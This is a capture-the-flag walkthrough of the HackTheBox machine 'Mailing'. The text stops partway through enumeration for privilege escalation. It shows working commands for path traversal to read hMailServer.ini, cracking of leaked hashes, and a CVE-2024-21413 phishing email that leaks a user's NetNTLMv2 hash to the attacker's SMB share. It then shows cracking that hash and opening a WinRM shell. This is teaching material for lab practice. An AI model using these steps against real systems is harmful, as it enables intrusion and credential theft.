---
title: HTB: Mailing
url: https://0xdf.gitlab.io/2024/09/07/htb-mailing.html
date: 2024-09-07T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, ctf, htb-mailing, nmap, ffuf, feroxbuster, file-read, directory-traversal, lfi, hmailserver, crackstation, cve-2024-21413, responder, net-ntlmv2, hashcat, netexec, evil-winrm, libreoffice, cve-2023-2255, seimpersonate, godpotato, python-smtplib, swaks, oscp-like-v3, oscp-plus-v3
---

![Mailing](/img/mailing-cover.png)

Mailing is a mail server company that offers webmail powered by hMailServer. There’s a PHP site which has a file read / directory traversal vulnerability. I’ll leak the hMailServer config, and crack the password hash to get valid credentials.

## Box Info

| Name | [Mailing](https://hackthebox.com/machines/mailing)  [Mailing](https://hackthebox.com/machines/mailing) [Play on HackTheBox](https://hackthebox.com/machines/mailing) |
| --- | --- |
| Release Date | [04 May 2024](https://twitter.com/hackthebox_eu/status/1786063134656000408) |
| Retire Date | 07 Sep 2024 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Mailing |
| Radar Graph | Radar chart for Mailing |
| First Blood User | 00:34:18[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 00:50:30[m4cz m4cz](https://app.hackthebox.com/users/275298) |
| Creators | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217)  [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` finds many open TCP ports on a Windows host:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.14
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-13 09:28 EDT
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.089s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
64959/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
oxdf@hacky$ nmap -p 25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,64959 -sCV 10.10.11.14
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-13 09:30 EDT
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.089s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IDLE OK CHILDREN IMAP4rev1 SORT CAPABILITY RIGHTS=texkA0001 IMAP4 NAMESPACE ACL completed QUOTA
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      hMailServer imapd
|_imap-capabilities: IDLE OK CHILDREN IMAP4rev1 SORT CAPABILITY RIGHTS=texkA0001 IMAP4 NAMESPACE ACL completed QUOTA
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
64959/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -20s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-05-13T13:32:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.33 seconds

```

The host is Windows, and based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) it’s at least 10 or server 1016.

Enumeration to prioritize:
- There’s a webserver on TCP 80. It’s redirecting to mailing.htb.
- SMB (445).

I’ll also note that there’s a bunch of mail-related ports: POP3 (110), IMAP (143, 993), SMTP (465, 587). These will likely need creds, though there’s potential to enumerate usernames.

WinRM (5985) is also open, so if I get creds, I’ll want to check to see if they work for a remote user.

### Subdomain Brute Force

Given the use of name-based routing on the webserver, I’ll use `ffuf` to check for any subdomains of `mailing.htb` the respond differently.

```

oxdf@hacky$ ffuf -u http://10.10.11.14 -H "Host: FUZZ.mailing.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.14
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.mailing.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 74 req/sec :: Duration: [0:05:02] :: Errors: 0 ::

```

It doesn’t find anything. I’ll add `mailing.htb` to my `/etc/hosts` file:

```
10.10.11.14 mailing.htb

```

### SMB - TCP 445

Without creds, I’m not able to get any access to SMB:;

```

oxdf@hacky$ netexec smb 10.10.11.14 -u guest -p ''
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\guest: STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec smb 10.10.11.14 -u oxdf -p 'oxdf'
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\oxdf:oxdf STATUS_LOGON_FAILURE 
oxdf@hacky$ smbclient -N -L //10.10.11.14
session setup failed: NT_STATUS_ACCESS_DENIED

```

### Website - TCP 80

#### Site

The website is for an organization that provides a mail server:

![image-20240504171557524](/img/image-20240504171557524.png)

There’s three names on the site which I’ll make note of.

The “Download Instructions” button is a link to `http://mailing.htb/download.php?file=instructions.pdf`. This is a 16 page PDF that contains instructions for setting up a mail client on Windows and Ubuntu, covering Windows Mail and Thunderbird. One thing to note in the document is the email address used in an example:

![image-20240506135209562](/img/image-20240506135209562.png)

`maya@mailing.htb` matches with the name above. I’ll note that, and that the other two users are likely `ruy@mailing.htb` and `gregory@mailing.htb`.

#### Tech Stack

The HTTP response headers have a good bit of information:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
X-Powered-By: ASP.NET
Date: Sat, 04 May 2024 21:15:19 GMT
Connection: close
Content-Length: 4681

```

It’s IIS, running both ASP.NET and PHP. PHP isn’t surprising as I already identified `download.php`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php,aspx` since I know the site is PHP and to check for ASP.NET files as well:

```

oxdf@hacky$ feroxbuster -u http://mailing.htb -x php,aspx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mailing.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, aspx]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       94w     1251c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       42l      159w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      132l      375w     4681c http://mailing.htb/
200      GET        1l        5w       31c http://mailing.htb/download.php
301      GET        2l       10w      160c http://mailing.htb/assets => http://mailing.htb/assets/
200      GET      132l      375w     4681c http://mailing.htb/index.php
301      GET        2l       10w      160c http://mailing.htb/Assets => http://mailing.htb/Assets/
200      GET        1l        5w       31c http://mailing.htb/Download.php
301      GET        2l       10w      166c http://mailing.htb/instructions => http://mailing.htb/instructions/
200      GET      132l      375w     4681c http://mailing.htb/Index.php
301      GET        2l       10w      166c http://mailing.htb/Instructions => http://mailing.htb/Instructions/
200      GET        1l        5w       31c http://mailing.htb/DOWNLOAD.php
200      GET        1l        5w       31c http://mailing.htb/DownLoad.php
400      GET        6l       26w      324c http://mailing.htb/error%1F_log
400      GET        6l       26w      324c http://mailing.htb/error%1F_log.php
400      GET        6l       26w      324c http://mailing.htb/error%1F_log.aspx
400      GET        6l       26w      324c http://mailing.htb/assets/error%1F_log
400      GET        6l       26w      324c http://mailing.htb/assets/error%1F_log.php
400      GET        6l       26w      324c http://mailing.htb/assets/error%1F_log.aspx
400      GET        6l       26w      324c http://mailing.htb/Assets/error%1F_log
400      GET        6l       26w      324c http://mailing.htb/Assets/error%1F_log.php
400      GET        6l       26w      324c http://mailing.htb/Assets/error%1F_log.aspx
400      GET        6l       26w      324c http://mailing.htb/instructions/error%1F_log
400      GET        6l       26w      324c http://mailing.htb/instructions/error%1F_log.php
400      GET        6l       26w      324c http://mailing.htb/instructions/error%1F_log.aspx
400      GET        6l       26w      324c http://mailing.htb/Instructions/error%1F_log
400      GET        6l       26w      324c http://mailing.htb/Instructions/error%1F_log.php
400      GET        6l       26w      324c http://mailing.htb/Instructions/error%1F_log.aspx
[####################] - 7m    450000/450000  0s      found:26      errors:0
[####################] - 5m     90000/90000   254/s   http://mailing.htb/
[####################] - 5m     90000/90000   253/s   http://mailing.htb/assets/
[####################] - 5m     90000/90000   253/s   http://mailing.htb/Assets/
[####################] - 5m     90000/90000   254/s   http://mailing.htb/instructions/
[####################] - 5m     90000/90000   280/s   http://mailing.htb/Instructions/

```

I already know about `download.php`, and nothing else looks interesting.

## Shell as maya

### Leak Administrator Password

#### Identify File Read

I noted above that the instructions were downloaded from `/download.php?file=instructions.pdf` I’ll watch to check this for a directory traversal / general file read. With a bit of playing around, I’ll get file read working:

```

oxdf@hacky$ curl http://mailing.htb/download.php?file=../../windows/system32/drivers/etc/hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
127.0.0.1       mailing.htb

```

It’s worth noting that it works as well with the slashes the other way, as long as they are escaped (so `\\`):

```

oxdf@hacky$ curl 'http://mailing.htb/download.php?file=..\\..\\windows\\system32\\drivers\\etc\\hosts'
# Copyright (c) 1993-2009 Microsoft Corp.
...[snip]...

```

The webserver is running out of an odd location, but if I were able to guess that it’s in `C:\wwwroot`, I could read the source of `download.php`:

```

oxdf@hacky$ curl http://mailing.htb/download.php?file=../../wwwroot/download.php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>

```

It’s literally just appending the input path to a base path and calling `file_get_contents`. This is not a local file include (LFI) vulnerability, as the contents fetched with `file_get_contents` are not executed as PHP code (which is why I’m able to read it as PHP source). This actually was an LFI at release, which I’ll show in [Beyond Root](#beyond-root---patched-unintended).

#### Recover Password Hash

hMailServer stores it’s configuration data in `hMailServer.ini`. There’s a bunch of places it seems like this can be located according to different documentation pages and searches. I’ll eventually find [this forum post](https://hmailserver.com/forum/viewtopic.php?t=39079) where a responder suggests `C:\Program Files (x86)\hMailServer\Bin\`:

[![image-20240506132326702](/img/image-20240506132326702.png)*Click for full size image*](/img/image-20240506132326702.png)

That works!

```

oxdf@hacky$ curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

```

There are two hashes stored as `AdministratorPassword` and `Password`.

#### Recover Password

These passwords hashes [are MD5](https://stackoverflow.com/questions/47713072/hmailserver-password-hashing), so I’ll drop them in [CrackStation](https://crackstation.net/):

![image-20240506132855084](/img/image-20240506132855084.png)

The administrator password is “homenetworkingadministrator”.

These creds don’t work for the administrator user on the box:

```

oxdf@hacky$ netexec smb mailing.htb -u administrator -p 'homenetworkingadministrator'
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\administrator:homenetworkingadministrator STATUS_LOGON_FAILURE

```

#### Validate Mail Password

Given that this credential came from hMailServer, it seems likely that it’ll work for logging into SMTP to send mail. I can validate that with Python and `smtplib`:

```

oxdf@hacky$ python
Python 3.12.3 (main, Jul 31 2024, 17:43:48) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import smtplib
>>> server = smtplib.SMTP('mailing.htb:587')
>>> server.login('administrator', 'homenetworkingadministrator')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.12/smtplib.py", line 750, in login
    raise last_exception
  File "/usr/lib/python3.12/smtplib.py", line 739, in login
    (code, resp) = self.auth(
                   ^^^^^^^^^^
  File "/usr/lib/python3.12/smtplib.py", line 662, in auth
    raise SMTPAuthenticationError(code, resp)
smtplib.SMTPAuthenticationError: (535, b'Authentication failed. Restarting authentication process.')
>>> server.login('administrator@mailing.htb', 'homenetworkingadministrator')
(235, b'authenticated.')

```

It fails when it tries the username “administrator”, but when I do “administrator@mailing.htb”, it reports success.

I could also use `swaks` (command line mail sender, `apt install swaks`) with the `--auth` flags and `--quit-after` to avoid actually sending any mail:

```

oxdf@hacky$ swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb
=== Trying mailing.htb:25...
=== Connected to mailing.htb.
<-  220 mailing.htb ESMTP
 -> EHLO hacky
<-  250-mailing.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
<-  334 UGFzc3dvcmQ6
 -> aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
<-  235 authenticated.
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

```

It shows success. If I change the password, it fails:

```

oxdf@hacky$ swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password bad_password --quit-after AUTH --server mailing.htb
=== Trying mailing.htb:25...
=== Connected to mailing.htb.
<-  220 mailing.htb ESMTP
 -> EHLO hacky
<-  250-mailing.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
<-  334 UGFzc3dvcmQ6
 -> YmFkX3Bhc3N3b3Jk
<** 535 Authentication failed. Restarting authentication process.
*** No authentication type succeeded
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

```

### CVE-2024-21413

#### Identify

Finding this CVE is a bit tricky. I guess from the installation PDF that they are likely using Windows Mail. Searching for Windows Mail CVEs does give some clues:

![image-20240506133837624](/img/image-20240506133837624.png)

The CVE is there, but in articles about Outlook. That’s because Outlook is a much more common mail client. And, even the [Nist page](https://nvd.nist.gov/vuln/detail/CVE-2024-21413) about this CVE says:

> Microsoft Outlook Remote Code Execution Vulnerability

Still, this vulnerability does impact both Outlook and Windows Mail.

#### Background

Outlook (and Windows Mail) has different security behaviors that it puts in place for different protocols of links that come in via email. One of the more restrictive is `file://` protocol. Researchers found that if the URL ends with “![anything]”, then that security is dropped, and the link will be processed without additional security. This means that an attacker can send one of these links, and when clicked (or sometimes opened in the preview pane), it will try to authenticate to the attacker’s SMB server, allowing the attacker to capture NetNTLMv2 hashes and potentially crack that user’s password.

POCs of this exploit will send an HTML body that looks like:

```

<html>
    <body>
        <img src="{base64_image_string}" alt="Image"><br />
        <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
    </body>
    </html>

```

Just by having this link open in the preview window, Windows Mail will try to load `{link_url}` over SMB.

### Exploit

There’s a solid [POC exploit](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) by xaitax on GitHub, which just generates the HTML email and sends it. I’ll clone this repo to my host:

```

oxdf@hacky$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
Cloning into 'CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0
Receiving objects: 100% (28/28), 14.48 KiB | 2.90 MiB/s, done.
Resolving deltas: 100% (7/7), done.

```

I’ll run the script with the following options:
- `--server mailing.htb` - Target server.
- `--port 587` - If I try on port 25, the script complains: “❌ Failed to send email: STARTTLS extension not supported by server.” It’s expecting TLS. 587 is the example port used in the POC `README.md`.
- `--username administrator@mailing.htb` - Leaked username from `hMailServer.ini`.
- `--password homenetworkingadministrator` - Cracked leaked password hash from `hMailServer.ini`.
- `--sender 0xdf@mailing.htb` - Doesn’t matter.
- `--recipient maya@mailing.htb` - Start by targeting maya, but could try others as well.
- `--url "\\10.10.14.6\share\sploit"` - Must be an SMB share on my VM, though exact path doesn’t matter.
- `--subject "Check this out ASAP!"` - Doesn’t matter here, but want it to be something that’ll be opened.

Running it sends the mail:

```

oxdf@hacky$ python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender 0xdf@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.6\share\sploit" --subject "Check this out ASAP!"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.

```

To capture the authentication attempt to my host, I’ll run [Responder](https://github.com/SpiderLabs/Responder):

```

oxdf@hacky$ sudo /opt/Responder/Responder.py
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Error: -I <if> mandatory option is missing
oxdf@hacky$ sudo /opt/Responder/Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.6]
    Responder IPv6             [dead:beef:2::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-7FWRTN5MH0T]
    Responder Domain Name      [XPFT.LOCAL]
    Responder DCE-RPC Port     [48145]

[+] Listening for events...

```

On starting it, Responder just hangs, listening for incoming connections. I’ll double check that SMB is listening, and it is. After a couple minutes, there’s an authentication attempt:

```

[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:cf2f50dc90776da8:623306538A25932E341BCF7CDB9F1BB0:010100000000000000C736FCBB9FDA01E70EBC33ADBCFCA00000000002000800580050004600540001001E00570049004E002D00370046005700520054004E0035004D0048003000540004003400570049004E002D00370046005700520054004E0035004D004800300054002E0058005000460054002E004C004F00430041004C000300140058005000460054002E004C004F00430041004C000500140058005000460054002E004C004F00430041004C000700080000C736FCBB9FDA0106000400020000000800300030000000000000000000000000200000C687034CB08D1FC8C01EA4F17BB2E84FFF9AE43E6796EA8B28F30C4910B4D2050A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya

```

### Crack

The hash is a Net-NTLMv2 challenge/response, which `hashcat` can auto-detect and crack this hash very quickly:

```

$ hashcat maya.netntlmv2 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:
                                                                                                                       
5600 | NetNTLMv2 | Network Protocol
                                                           
NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.   
...[snip]...
MAYA::MAILING:cf2f50dc90776da8:623306538a25932e341bcf7cdb9f1bb0:010100000000000000c736fcbb9fda01e70ebc33adbcfca00000000002000800580050004600540001001e00570049004e002d00370046005700520054004e0035004d0048003000540004003400570049004e002d0037
0046005700520054004e0035004d004800300054002e0058005000460054002e004c004f00430041004c000300140058005000460054002e004c004f00430041004c000500140058005000460054002e004c004f00430041004c000700080000c736fcbb9fda0106000400020000000800300030000000
000000000000000000200000c687034cb08d1fc8c01ea4f17bb2e84fff9ae43e6796ea8b28f30c4910b4d2050a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000:m4y4ngs4ri
...[snip]...

```

The password is “m4y4ngs4ri”.

### WinRM

#### Enumerate

The creds work for both SMB and WinRM:

```

oxdf@hacky$ netexec smb mailing.htb -u maya -p m4y4ngs4ri
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
oxdf@hacky$ netexec winrm mailing.htb -u maya -p m4y4ngs4ri
WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)

```

#### Shell

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell:

```

oxdf@hacky$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents>

```

And grab the user flag:

```
*Evil-WinRM* PS C:\Users\maya\desktop> type user.txt
5f13f085************************

```

## Shell as localadmin

### Enumeration

#### Home Directories

There’s not much else of interest in maya’s home directory. There are some scripts for automating the phishing:

```
*Evil-WinRM* PS C:\Users\maya> ls documents

    Directory: C:\Users\maya\documents
                                                    
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/13/2024   4:49 PM                WindowsPowerShell
-a----         4/11/2024   1:24 AM            807 mail.py
-a----         3/14/2024   4:30 PM            557 mail.vbs

```

But they don’t contain anything to help advance from here.

localadmin is the administrative user here:

```
*Evil-WinRM* PS C:\users> ls

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/28/2024   8:50 PM                .NET v2.0
d-----         2/28/2024   8:50 PM                .NET v2.0 Classic
d-----         2/28/2024   8:50 PM                .NET v4.5
d-----         2/28/2024   8:50 PM                .NET v4.5 Classic
d-----         2/28/2024   8:50 PM                Classic .NET AppPool
d-----          3/9/2024   1:52 PM                DefaultAppPool
d-----          3/4/2024   8:32 PM                localadmin
d-----         2/28/2024   7:34 PM                maya
d-r---         3/10/2024   4:56 PM                Public

```

#### File System

There root of `C:\` has a couple interesting folders:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/10/2024   5:32 PM                Important Documents
d-----         2/28/2024   8:49 PM                inetpub
d-----         12/7/2019  10:14 AM                PerfLogs
d-----          3/9/2024   1:47 PM                PHP
d-r---         3/13/2024   4:49 PM                Program Files
